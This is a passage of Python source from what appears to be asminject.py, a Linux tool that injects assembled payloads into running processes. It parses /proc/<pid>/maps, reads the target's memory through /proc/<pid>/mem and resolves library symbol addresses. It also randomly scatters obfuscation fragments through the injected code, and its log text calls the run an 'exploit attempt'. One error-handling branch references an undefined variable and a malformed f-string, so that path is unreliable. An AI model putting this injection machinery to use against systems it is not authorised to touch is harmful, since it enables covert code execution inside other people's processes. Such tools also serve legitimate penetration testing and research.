        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_PAYLOAD_DATA_TYPE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_payload_data_type, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_PAYLOAD_DATA_1:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_payload_data_1, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_PAYLOAD_DATA_2:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_payload_data_2, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_SCRIPT_DATA_TYPE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_script_data_type, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_SCRIPT_DATA_1:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_script_data_1, offset_placeholder)
        result['[VARIABLE:COMMUNICATION_ADDRESS_OFFSET_SCRIPT_DATA_2:VARIABLE]'] = self.get_hex_value_or_placeholder(self.communication_address_offset_script_data_2, offset_placeholder)
        
        # state variables
        result['[VARIABLE:STATE_SWITCH_TO_NEW_COMMUNICATION_ADDRESS:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["switch_to_new_communication_address"], placeholder_value_address)
        result['[VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["ready_for_stage_two_write"], placeholder_value_address)
        result['[VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["stage_two_written"], placeholder_value_address)
        result['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["ready_for_memory_restore"], placeholder_value_address)
        result['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["memory_restored"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_TO_SCRIPT_MESSAGE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_to_script_message"], placeholder_value_address)
        result['[VARIABLE:STATE_SCRIPT_TO_PAYLOAD_MESSAGE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["script_to_payload_message"], placeholder_value_address)
        result['[VARIABLE:STATE_MESSAGE_RECEIVED:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["message_received"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_READY_FOR_SCRIPT_CLEANUP:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_ready_for_script_cleanup"], placeholder_value_address)
        result['[VARIABLE:STATE_SCRIPT_CLEANUP_COMPLETE:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["script_cleanup_complete"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_SHOULD_EXIT:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_should_exit"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_EXITING:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_exiting"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_AWAITING_STRING:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_awaiting_string"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_AWAITING_BINARY_DATA:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_awaiting_binary_data"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_AWAITING_SIGNED_INTEGER:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_awaiting_signed_integer"], placeholder_value_address)
        result['[VARIABLE:STATE_PAYLOAD_AWAITING_UNSIGNED_INTEGER:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.state_map["payload_awaiting_unsigned_integer"], placeholder_value_address)
        
        # state message type indicators
        result['[VARIABLE:MESSAGE_TYPE_SIGNED_INTEGER:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.message_type_map["signed_integer"], placeholder_value_address)
        result['[VARIABLE:MESSAGE_TYPE_UNSIGNED_INTEGER:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.message_type_map["unsigned_integer"], placeholder_value_address)
        result['[VARIABLE:MESSAGE_TYPE_POINTER_TO_BINARY_DATA:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.message_type_map["pointer_to_binary_data"], placeholder_value_address)
        result['[VARIABLE:MESSAGE_TYPE_POINTER_TO_STRING_DATA:VARIABLE]'] = self.get_hex_value_or_placeholder(self.state_variables.message_type_map["pointer_to_string_data"], placeholder_value_address)
       
        # general purpose register replacements
        gpr_map = self.get_general_purpose_register_replacement_map()
        for k in gpr_map.keys():
            result[k] = gpr_map[k]
        
        # processor state replacements
        result['[STATE_BACKUP_INSTRUCTIONS]'] = self.get_randomized_state_backup_instruction_list()
        result['[STATE_RESTORE_INSTRUCTIONS]'] = self.get_randomized_state_restore_instruction_list()
       
        return result
    
    def get_map_file_path(self):
        return f"/proc/{self.pid}/maps"
    
    def create_empty_temp_file(self, subdirectory_name = None, suffix = None):
        out_path = None
        tf = None
        target_directory = self.temp_file_base_directory
        if subdirectory_name:
            target_directory = os.path.join(self.temp_file_base_directory, subdirectory_name)
        asminject_parameters.make_required_directory(target_directory, self)
        if suffix:
            (tf, out_path) = tempfile.mkstemp(suffix=suffix, dir=target_directory, text=False)
        else:
            (tf, out_path) = tempfile.mkstemp(dir=target_directory, text=False)
        os.close(tf)
        return out_path
    
    @staticmethod
    def make_required_directory(directory_path, injection_params):
        try:
            Path(directory_path).mkdir(parents=True, exist_ok=True)
        except Exception as e:
            log_error(f"Could not create the required output directory '{directory_path}': {e}", ansi=injection_params.ansi)
            sys.exit(1)

    @staticmethod
    def delete_directory_tree(directory_path, injection_params):
        try:
            shutil.rmtree(directory_path)
        except Exception as e:
            log_warning(f"Could not recursively delete the directory '{directory_path}': {e}", ansi=injection_params.ansi)

class communication_variables:
    def __init__(self):
        self.payload_state_value = None
        self.script_state_value = None
        self.read_execute_address = None
        self.read_write_address = None
        self.payload_data_type = None
        self.payload_data_1 = None
        self.payload_data_2 = None
        self.script_data_type = None
        self.script_data_1 = None
        self.script_data_2 = None
    
    def read_word(self, injection_params, memory_handle):
        return struct.unpack(injection_params.register_size_format_string, memory_handle.read(injection_params.register_size))[0]
    
    def read_current_values(self, injection_params, process_memory_path, communication_address):
        try:
            with open(process_memory_path, "rb") as mem:
                try:
                    mem.seek(communication_address + injection_params.communication_address_offset_payload_state)
                    self.payload_state_value = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_script_state)
                    self.script_state_value = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_read_execute_base_address)
                    self.read_execute_address = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_read_write_base_address)
                    self.read_write_address = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_payload_data_type)
                    self.payload_data_type = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_payload_data_1)
                    self.payload_data_1 = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_payload_data_2)
                    self.payload_data_2 = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_script_data_type)
                    self.script_data_type = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_script_data_1)
                    self.script_data_1 = self.read_word(injection_params, mem)
                    
                    mem.seek(communication_address + injection_params.communication_address_offset_script_data_2)
                    self.script_data_2 = self.read_word(injection_params, mem)
                    
                
                except Exception as e:
                    log_error(f"Couldn't get target process information: {e}", ansi=injection_params.ansi)
        except FileNotFoundError as e:
            log_error(f"Target process disappeared during injection attempt - exiting", ansi=injection_params.ansi)
            sys.exit(1)
        if injection_params.enable_debugging_output:
            current_state_log_output = f"Communications address data at {hex(communication_address)}:\n"
            current_state_log_output += f"\tPayload state: {injection_params.state_variables.get_state_name_from_value(self.payload_state_value)}\n"
            current_state_log_output += f"\tScript state: {injection_params.state_variables.get_state_name_from_value(self.script_state_value)}\n"
            current_state_log_output += f"\tRead/execute block base address: {hex(self.read_execute_address)}\n"
            current_state_log_output += f"\tRead/write block base address: {hex(self.read_write_address)}\n"
            current_state_log_output += f"\tPayload data type: {hex(self.payload_data_type)}\n"
            current_state_log_output += f"\tPayload data 1: {hex(self.payload_data_1)}\n"
            current_state_log_output += f"\tPayload data 2: {hex(self.payload_data_2)}\n"
            current_state_log_output += f"\tScript data type: {hex(self.script_data_type)}\n"
            current_state_log_output += f"\tScript data 1: {hex(self.script_data_1)}\n"
            current_state_log_output += f"\tScript data 2: {hex(self.script_data_2)}\n"
        
            log(current_state_log_output, ansi=injection_params.ansi)

class memory_map_permissions:
    def set_default_values(self):
        self.read = False
        self.write = False
        self.execute = False
        self.shared = False
    
    def set_from_permission_string(self, permission_string):
        if permission_string[0:1].lower() == "r":
            self.read = True
        if permission_string[1:2].lower() == "w":
            self.write = True
        if permission_string[2:3].lower() == "x":
            self.execute = True
        if permission_string[3:4].lower() == "s":
            self.shared = True
    
    def to_permission_string(self):
        result = ""
        if self.read:
            result += "r"
        else:
            result += "-"
        if self.write:
            result += "w"
        else:
            result += "-"
        if self.execute:
            result += "x"
        else:
            result += "-"
        if self.shared:
            result += "s"
        else:
            result += "p"
        return result
            
    def __init__(self):
        self.set_default_values()
    
    @staticmethod
    def from_permission_string(permission_string):
        result = memory_map_permissions()
        result.set_from_permission_string(permission_string)
        return result

class memory_map_entry:
    def set_default_values(self):
        self.start_address = None
        self.end_address = None
        self.permissions = None
        self.offset = None
        self.device = None
        self.inode = None
        self.path = None
        self.position_independent_code = False
        self.backup_path = None
        self.symbol_list = None
    
    def set_permissions_from_string(self, permission_string):
        self.permissions = memory_map_permissions.from_permission_string(permission_string)
    
    def set_from_map_entry_line(self, map_entry_line):
        linesplit = map_entry_line.split()
        addr_split = linesplit[0].split("-")
        self.start_address = int(addr_split[0], 16)
        self.end_address = int(addr_split[1], 16)
        perms = linesplit[1]
        self.set_permissions_from_string(perms)
        self.offset = int(linesplit[2], 16)
        self.device = linesplit[3]
        self.inode = linesplit[4]
        self.path = linesplit[-1]

    def __init__(self):
        self.set_default_values()
        
    @staticmethod
    def from_map_entry_line(map_entry_line):
        result = memory_map_entry()
        result.set_from_map_entry_line(map_entry_line)
        return result
    
    def get_base_address(self):
        if self.position_independent_code:
            return self.start_address
        return 0
    
    def get_description_string(self):
        return f"{hex(self.start_address)} - {hex(self.end_address)} (Path: '{self.path}')"
    
    def to_dictionary(self):
        result = {}
        result["start_address"] = self.start_address
        result["end_address"] = self.end_address
        result["permissions"] = self.permissions.to_permission_string()
        result["offset"] = self.offset
        result["device"] = self.device
        result["inode"] = self.inode
        result["path"] = self.path
        result["backup_path"] = self.backup_path
        result["position_independent_code"] = self.position_independent_code
        return result
    
    def to_json(self):
        return json.dumps(self.to_dictionary())
    
    @staticmethod
    def from_dictionary(dict):
        result = memory_map_entry()
        if "start_address" in dict.keys():
            result.start_address = dict["start_address"]
        if "end_address" in dict.keys():
            result.end_address = dict["end_address"]
        if "permissions" in dict.keys():
            perms = memory_map_permissions()
            perms.set_from_permission_string(dict["permissions"])
            result.permissions = perms
        if "offset" in dict.keys():
            result.offset = dict["offset"]
        if "device" in dict.keys():
            result.device = dict["device"]
        if "inode" in dict.keys():
            result.inode = dict["inode"]
        if "path" in dict.keys():
            result.path = dict["path"]
        if "backup_path" in dict.keys():
            result.backup_path = dict["backup_path"]
        if "position_independent_code" in dict.keys():
            result.position_independent_code = dict["position_independent_code"]
        return result
    
    @staticmethod
    def from_json(json_string):
        return memory_map_entry.from_dictionary(json.loads(json_string))
        

class asminject_memory_map_data:
    def __init__(self):
        self.map_data = {}
        self.map_data_keys_ordered = []
        self.first_region_for_named_file_map = {}
        self.backup_directory = None

    def get_unique_path_names(self):
        return self.first_region_for_named_file_map.keys()
    
    def get_first_region_for_named_file(self, file_path):
        existing_path_names = self.get_unique_path_names()
        if file_path not in existing_path_names:
            raise Exception(f"Could not locate a memory map entry for '{file_path}'")
        region_start_address = self.first_region_for_named_file_map[file_path].start_address
        if region_start_address not in self.map_data.keys():
            print(self.map_data.keys())
            raise Exception(f"Found a memory map file path entry for '{file_path}', with base address '{region_start_address}', but no entry was found for it in the main list of memory regions. This is almost certainly a bug in asminject.py")
        return self.map_data[region_start_address]
    
    def add_first_region_data(self, injection_params, new_map_entry):
        if new_map_entry.path.strip() != "" and new_map_entry.path not in self.first_region_for_named_file_map.keys():
            #result_entry = {}
            #result_entry["access"] = linesplit[1]
            
            if new_map_entry.position_independent_code:
                #result_entry["base"] = ld_base
                #result_entry["end"] = ld_end
                if new_map_entry.start_address <= injection_params.max_address_npic_suggestion:
                    log_warning(f"'{new_map_entry.path}' has a base address of {hex(new_map_entry.start_address)}, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary \"{new_map_entry.path}\" to your asminject.py options.", ansi=injection_params.ansi)
            else:
                
                #result_entry["base"] = 0
                #result_entry["end"] = ld_end
                log_warning(f"Handling '{new_map_entry.path}' as non-PIC binary", ansi=injection_params.ansi)
            
            self.first_region_for_named_file_map[new_map_entry.path] = new_map_entry
                    
                    #result[new_map_entry.path] = result_entry
    
    def load_memory_map_data(self, injection_params):
        with open(injection_params.get_map_file_path()) as maps_file:
            for line in maps_file.readlines():
                new_map_entry = memory_map_entry.from_map_entry_line(line)
                self.map_data[new_map_entry.start_address] = new_map_entry
                self.map_data_keys_ordered.append(new_map_entry.start_address)
                if new_map_entry.path.strip() != "":
                    new_map_entry.position_independent_code = True
                    for npb_pattern in injection_params.non_pic_binaries:
                        if re.search(npb_pattern, new_map_entry.path):
                            new_map_entry.position_independent_code = False
                            break
                
                self.add_first_region_data(injection_params, new_map_entry)
                #self.add_entry(injection_params, new_map_entry)
                
    def to_array(self):
        result = []
        for start_address in self.map_data_keys_ordered:
            result_entry = self.map_data[start_address].to_dictionary()
            result.append(result_entry)
        return result

    def to_json(self):
        return json.dumps(self.to_array())
        
    def add_entry(self, injection_params, new_entry):
        self.map_data_keys_ordered.append(new_entry.start_address)
        self.map_data[new_entry.start_address] = new_entry
        self.add_first_region_data(injection_params, new_entry)
    
    @staticmethod
    def from_array(injection_params, arr):
        result = asminject_memory_map_data()
        for arr_entry in arr:
            new_entry = memory_map_entry.from_dictionary(arr_entry)
            result.add_entry(injection_params, new_entry)
        return result
    
    @staticmethod
    def from_json(json_string):
        arr = json.loads(json_string)
        return asminject_memory_map_data.from_array(arr)

def ansi_color(name):
    color_codes = {
        "blue": 34,
        "red": 91,
        "orange": 209,
        "green": 32,
        "default": 39,
    }
    return f"\x1b[{color_codes[name]}m"


def log(msg, color="blue", symbol="*", ansi=True):
    if ansi:
        print(f"{ansi_color(color)}[{symbol}]{ansi_color('default')} {msg}")
    else:
        print(f"[{symbol}] {msg}")


def log_success(msg, ansi=True):
    log(msg, "green", "+", ansi)

def log_warning(msg, ansi=True):
    log(msg, "orange", "-", ansi)

def log_error(msg, ansi=True):
    log(msg, "red", "!", ansi)
    #raise Exception(msg)

def get_random_obfuscation_fragment(injection_params, use_communications_address_fragments, use_allocated_read_write_fragments, obfuscation_iteration):
    result = None
    
    injection_params.cache_obfuscation_files()
    fragment_list = []
    for frag in injection_params.obfuscation_fragments_general_purpose:
        fragment_list.append(frag)
    
    if use_communications_address_fragments:
        for frag in injection_params.obfuscation_fragments_communications_address:
            fragment_list.append(frag)
    
    if use_allocated_read_write_fragments:
        for frag in injection_params.obfuscation_fragments_allocated_memory:
            fragment_list.append(frag)

    result = fragment_list[secrets.randbelow(len(fragment_list))]

    per_fragment_replacement_map = injection_params.get_general_purpose_register_replacement_map()
        
    per_fragment_replacement_map["[VARIABLE:OBFUSCATION_FRAGMENT_NUMBER:VARIABLE]"] = f"{injection_params.obfuscation_fragment_counter}"

    for search_text in per_fragment_replacement_map.keys():
        result = result.replace(search_text, per_fragment_replacement_map[search_text])
    
    # indent by the number of iterations to make debugging easier
    result_lines = result.splitlines()
    result = ""
    tabs = "\t\t"
    for i in range(0, obfuscation_iteration):
        tabs = f"{tabs}\t"
    for rl in result_lines:
        rl_strip = rl.rstrip()
        if result == "":
            result = f"{tabs}{rl_strip}\n"        
        else:
            result = f"{result}{tabs}{rl_strip}\n"
    result = f"{result}\n"
    
    injection_params.obfuscation_fragment_counter += 1  
    
    return result
    
def next_line_can_be_obfuscated(injection_params, lines, current_line_number):
    result = True
    current_line_trimmed = lines[current_line_number].strip()
    instruction_trimmed = current_line_trimmed.split()[0].lower()
    # Do not obfuscate after blank lines - too ambiguous
    if len(current_line_trimmed) == 0:
        return False
    # Do not obfuscate lines beginning with a ., because they're probably data
    if current_line_trimmed[0:1] == ".":
        return False
    # Do not obfuscate lines beginning with a _
    if current_line_trimmed[0:1] == "_":
        return False    
    # Do not obfuscate lines immediately after labels, because they might be data
    if current_line_trimmed[-1:] == ":":
        return False
      # Do not obfuscate lines immediately after comments - just after actual code
    if current_line_trimmed[0:2] == "//" or current_line_trimmed[0:1] == "#":
        return False
        
    # Do not obfuscate lines ending with "[pc]", because the next real line after that 
    # is data that needs to stay in the same place
    if current_line_trimmed[-4:] == "[pc]":
        return False
    # same for "pc":
    if current_line_trimmed[-2:] == "pc":
        return False
        
    # Do not obfuscate after processor-specific instructions
    if instruction_trimmed in injection_params.no_obfuscation_after_instructions:
        #if injection_params.enable_debugging_output:
        #    log(f"Instruction '{instruction_trimmed}' is in the list to not obfuscate after for this architecture", ansi=injection_params.ansi)
        return False

    # Do not obfuscate after instructions that set flag values
    flag_setting_instructions = injection_params.flag_setting_instructions
    for fsi in flag_setting_instructions:
        if instruction_trimmed == fsi:
            #if injection_params.enable_debugging_output:
            #    log(f"Instruction '{instruction_trimmed}' is in the list of flag-setting instructions for this architecture", ansi=injection_params.ansi)
            return False
    
    # For ARM32 only, do not obfuscate after instructions that end in "s", 
    # as these also typically set flag values
    if injection_params.architecture == "arm32":
        if instruction_trimmed[-1:] == "s":
            return False

    # checks that depend on the previous line
    if current_line_number > 0:
        previous_line_trimmed = lines[current_line_number - 1].strip()
        # some [pc] references are two lines ahead
        if previous_line_trimmed[-4:] == "[pc]":
            return False
    
    return result

def obfuscate_assembly_source(injection_params, original_source, obfuscation_iteration):
    result_lines = []
    for line in original_source.splitlines():
        if line.strip() != "":
            result_lines.append(line)
    
    result = ""
    obfuscation_enabled = True
    # use fragments that require memory allocated by the script
    use_allocated_memory = False
    # use fragments that require a communications address
    use_communications_address = True
    for line_num in range(0, len(result_lines)):
        current_line = result_lines[line_num]
        if result == "":
            result = current_line
        else:
            result = f"{result}\n{current_line}"
        if "OBFUSCATION_OFF" in current_line.strip():
            obfuscation_enabled = False
        if "OBFUSCATION_ON" in current_line.strip():
            obfuscation_enabled = True
        if "OBFUSCATION_ALLOCATED_MEMORY_OFF" in current_line.strip():
            use_allocated_memory = False
        if "OBFUSCATION_ALLOCATED_MEMORY_ON" in current_line.strip():
            use_allocated_memory = True
        if "OBFUSCATION_COMMUNICATIONS_ADDRESS_OFF" in current_line.strip():
            use_communications_address = False
        if "OBFUSCATION_COMMUNICATIONS_ADDRESS_ON" in current_line.strip():
            use_communications_address = True
        if obfuscation_enabled:
            if next_line_can_be_obfuscated(injection_params, result_lines, line_num):
                if asminject_parameters.get_random_float_for_shuffle() <= injection_params.per_line_obfuscation_percentage:
                    fragment_source = get_random_obfuscation_fragment(injection_params, use_communications_address, use_allocated_memory, obfuscation_iteration)
                    result = f"{result}\n{fragment_source}"
    return result
    
def get_code_fragment(injection_params, fragment_file_name):
    fragment_file_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, injection_params.fragment_directory_name, fragment_file_name)
    fragment_source = None
    if not os.path.isfile(fragment_file_path):
        log_error(f"Could not find the assembly source code fragment '{fragment_file_path}' referenced in the payload", ansi=injection_params.ansi)
        return None
    try:
        with open(fragment_file_path, "r") as fragment_source_file:
            fragment_source = fragment_source_file.read()
    except Exception as e:
        log_error(f"Could not read assembly source code fragment '{fragment_file_path}' referenced in the payload: {e}", ansi=injection_params.ansi)
        return None
    return fragment_source

def get_elf_symbol_to_offset_map(elf_path):
    result = {}
    # avoid importing this unless explicitly needed, since it's a nonstandard library
    import elftools.elf.sections
    from elftools.elf.elffile import ELFFile
    with open(elf_path, "rb") as elf_file:
        elf = ELFFile(elf_file)
        for elf_section in elf.iter_sections():
            is_symbol_section = False
            
            if isinstance(elf_section, elftools.elf.sections.SymbolTableSection):
                is_symbol_section = True
            
            if is_symbol_section:
                #print(f"{elf_section.name}\t{elf_section}")
                for symbol in elf_section.iter_symbols():
                    #print(f"\t{symbol.name}\t{hex(symbol.entry.st_value)}")
                    result[symbol.name] = symbol.entry.st_value
    return result

def get_offset_from_map_by_regex(injection_params, symbol_map, regex):
    for symbol_name in symbol_map.keys():
        if injection_params.enable_debugging_output:
            log(f"Checking '{symbol_name}' against relative offset regex placeholder '{regex}' from assembly code", ansi=injection_params.ansi)
        if re.search(f"^{regex}$", symbol_name):
            return (symbol_name, symbol_map[symbol_name])
    return None

def write_source_to_file(injection_params, source_code, description, file_name_suffix):
    if injection_params.write_assembly_source_to_disk:
        try:
            out_path = injection_params.create_empty_temp_file(subdirectory_name = injection_params.payload_assembly_subdirectory_name, suffix = f"{file_name_suffix}.s")
            log(f"Writing {description} assembly source to '{out_path}'", ansi=injection_params.ansi)
            with open(out_path, "w") as source_code_file:
                source_code_file.write(source_code)
        except Exception as e:
            log_error(f"Couldn't write {description} assembly source to '{out_path}': {e}", ansi=injection_params.ansi)

def assemble(source, injection_params, memory_map_data, file_name_suffix, replacements = {}):
    formatted_source = source
    memory_map_path_names = memory_map_data.get_unique_path_names()
    for lname in memory_map_path_names:
        if injection_params.enable_debugging_output:
            log(f"Library base entry: '{lname}'", ansi=injection_params.ansi)
    
    # Recursively replace any fragment references with actual file content
    initial_fragment_list = []
    replaced_fragment_file_names = []
    # build a list of just the unique fragment references
    fragment_placeholders_matches = re.finditer(r'(\[FRAGMENT:)(.*?)(:FRAGMENT\])', formatted_source)
    for match in fragment_placeholders_matches:
        match_text = match.group(0)
        fragment_file_name = match.group(2)
        if fragment_file_name not in replaced_fragment_file_names:
            initial_fragment_list.append(match_text)
            #replaced_fragment_file_names.append(fragment_file_name)
            formatted_source = formatted_source.replace(match_text, "")
    
    # randomize initial fragment order
    #random.shuffle(initial_fragment_list, asminject_parameters.get_random_float_for_shuffle)
    initial_fragment_list_shuffled = asminject_parameters.get_securely_shuffled_array(initial_fragment_list)
    fragment_source = ""
    for i in range (0, len(initial_fragment_list_shuffled)):
        fragment_source = f"{fragment_source}{os.linesep}{os.linesep}{initial_fragment_list_shuffled[i]}"

    fragment_refs_found = True
    recursion_count = 0
    while fragment_refs_found:
        found_this_iteration = 0
        fragment_placeholders = []
        fragment_placeholders_matches = re.finditer(r'(\[FRAGMENT:)(.*?)(:FRAGMENT\])', fragment_source)
        for match in fragment_placeholders_matches:
            fragment_file_name = match.group(2)
            match_text = match.group(0)
            if fragment_file_name in replaced_fragment_file_names:
                # fragment has already been incorporated
                fragment_source = fragment_source.replace(match_text, "")
            else:
                # new fragment
                if injection_params.enable_debugging_output:
                    log(f"Found code fragment placeholder '{fragment_file_name}' in assembly code", ansi=injection_params.ansi)
                fragment_placeholders.append(fragment_file_name)
                replaced_fragment_file_names.append(fragment_file_name)
        for fragment_file_name in fragment_placeholders:
            new_fragment_source = get_code_fragment(injection_params, fragment_file_name)
            string_to_replace = f"[FRAGMENT:{fragment_file_name}:FRAGMENT]"
            if injection_params.enable_debugging_output:
                log(f"Replacing '{string_to_replace}' with the content of file '{fragment_file_name}' in assembly code", ansi=injection_params.ansi)
            fragment_source = fragment_source.replace(string_to_replace, new_fragment_source)
        if len(fragment_placeholders) == 0:
            fragment_refs_found = False
        else:
            recursion_count += 1
            if recursion_count > injection_params.max_fragment_recursion:
                recursion_reference_string = ""
                recursion_reference_keys = []
                for rck in recursion_count_list.keys():
                    if rck not in recursion_reference_keys:
                        recursion_reference_keys.append(rck)
                recursion_reference_keys.sort()
                for ref_key in recursion_reference_keys:
                    new_key_string = f"{ref_key}: {recursion_count_list:ref_key} references"
                    if recursion_reference_string == "":
                        recursion_reference_string = new_key_string
                    else:
                        recursion_reference_string = f"{recursion_reference_string}, {new_key_string}"
                log_error(f"Reached maximum recursion count of {injection_params.max_fragment_recursion} while importing assembly code fragments. This is usually due to a reference loop, such as fragment A referencing fragment B, while fragment B also references fragment A. The fragment files with the highest counts in the following list are most likely responsible: {recursion_reference_string}", ansi=injection_params.ansi)
                return None
    
    formatted_source = formatted_source.replace(injection_params.fragment_placeholder, fragment_source)
    
    for rname in replacements.keys():
        if injection_params.enable_debugging_output:
            log(f"Replacement key: '{rname}', value '{replacements[rname]}'", ansi=injection_params.ansi)  
    
    # Replace function address placeholders
    # e.g. [SYMBOL_ADDRESS:^printf($|@@.+):IN_BINARY:.+/libc[\-0-9so\.]*.(so|so\.[0-9]+)$:SYMBOL_ADDRESS]
    function_address_placeholders = []
    function_address_placeholder_matches = re.finditer(r'(\[SYMBOL_ADDRESS:)(.*?)(:SYMBOL_ADDRESS\])', formatted_source)
    for match in function_address_placeholder_matches:
        function_and_library = match.group(2)
        if function_and_library not in function_address_placeholders:
            if injection_params.enable_debugging_output:
                log(f"Found function address placeholder '{function_and_library}' in assembly code", ansi=injection_params.ansi)
            function_address_placeholders.append(function_and_library)
    for func_addr_placeholder in function_address_placeholders:
        found_func_addr_match = False
        func_addr_placeholder_split = func_addr_placeholder.split(":IN_BINARY:")
        func_addr_function_regex = func_addr_placeholder_split[0]
        func_addr_binary_regex = func_addr_placeholder_split[1]
        
        for lname in memory_map_path_names:
            if not found_func_addr_match:
                if injection_params.enable_debugging_output:
                    log(f"Testing '{lname}' against binary path regex '{func_addr_binary_regex}' in assembly code", ansi=injection_params.ansi)
                if re.search(func_addr_binary_regex, lname):
                    if injection_params.enable_debugging_output:
                        log(f"Checking '{lname}' for function address placeholder '{func_addr_placeholder}' in assembly code", ansi=injection_params.ansi)
                    # If relative addresses have already been provided or collected for the specified binary, use the existing data
                    # Otherwise, collect and cache it
                    binary_relative_offsets = {}
                    if lname in injection_params.relative_offsets.keys():
                        if injection_params.enable_debugging_output:
                            log(f"Checking existing list of relative offsets for '{lname}' for a function that matches regular expression '{func_addr_function_regex}'", ansi=injection_params.ansi)
                        binary_relative_offsets = injection_params.relative_offsets[lname]
                    else:
                        if injection_params.relative_offsets_from_binaries:
                            if os.path.isfile(lname):
                                if injection_params.enable_debugging_output:
                                    log(f"Collecting a list of relative offsets from '{lname}' and then checking them for a function that matches regular expression '{func_addr_function_regex}'", ansi=injection_params.ansi)
                                injection_params.relative_offsets[lname] = get_elf_symbol_to_offset_map(lname)
                                binary_relative_offsets = injection_params.relative_offsets[lname]
                            else:
                                log(f"Ignoring '{lname}' because it is not a file. If you really need to reference symbols in that region of memory, provide them from a file with the --relative-offsets option", ansi=injection_params.ansi)
                        else:
                            if injection_params.enable_debugging_output:
                                log(f"Ignoring '{lname}' because no relative offsets were provided for that file and the option to collect them is disabled", ansi=injection_params.ansi)
                    # wherever the list came from, check it for the function in question
                    for symbol_name in binary_relative_offsets.keys():
                        if not found_func_addr_match:
                            if re.search(func_addr_function_regex, symbol_name):
                                if injection_params.enable_debugging_output:
                                    log(f"Found a match for '{func_addr_function_regex}' in symbol list for '{lname}': '{symbol_name}'", ansi=injection_params.ansi)
                                function_address = memory_map_data.get_first_region_for_named_file(lname).get_base_address() + binary_relative_offsets[symbol_name]
                                replacements[f"[SYMBOL_ADDRESS:{func_addr_placeholder}:SYMBOL_ADDRESS]"] = f"{hex(function_address)}"
                                found_func_addr_match = True
                                break
        if not found_func_addr_match:
            log_error(f"Could not find a match for the function address placeholder '{func_addr_placeholder}' in the target process. Make sure you've targeted the correct process, and that it is compatible with the selected payload. If you believe you've received this message in error, please open an issue on GitHub.", ansi=injection_params.ansi)
            return None
    
    # # Replace base address regex matches
    # lname_placeholders = []
    # lname_placeholders_matches = re.finditer(r'(\[BASEADDRESS:)(.*?)(:BASEADDRESS\])', formatted_source)
    # placeholder_match_binary_paths = []
    # for match in lname_placeholders_matches:
        # placeholder_regex = match.group(2)
        # if placeholder_regex not in lname_placeholders:
            # if injection_params.enable_debugging_output:
                # log(f"Found library base address regex placeholder '{placeholder_regex}' in assembly code", ansi=injection_params.ansi)
            # lname_placeholders.append(placeholder_regex)
    # for lname_regex in lname_placeholders:
        # found_library_match = False
        # for lname in memory_map_path_names:
            # #if injection_params.enable_debugging_output:
            # #    log(f"Checking '{lname}' against library base address regex placeholder '{lname_regex}' from assembly code", ansi=injection_params.ansi)
            # if re.search(lname_regex, lname):
                # log(f"Using '{lname}' for library base address regex placeholder '{lname_regex}' in assembly code", ansi=injection_params.ansi)
                # replacements[f"[BASEADDRESS:{lname_regex}:BASEADDRESS]"] = f"{hex(memory_map_data.get_first_region_for_named_file(lname).get_base_address())}"
                # if lname not in placeholder_match_binary_paths:
                    # placeholder_match_binary_paths.append(lname)
                # found_library_match = True
                # break
        # if not found_library_match:
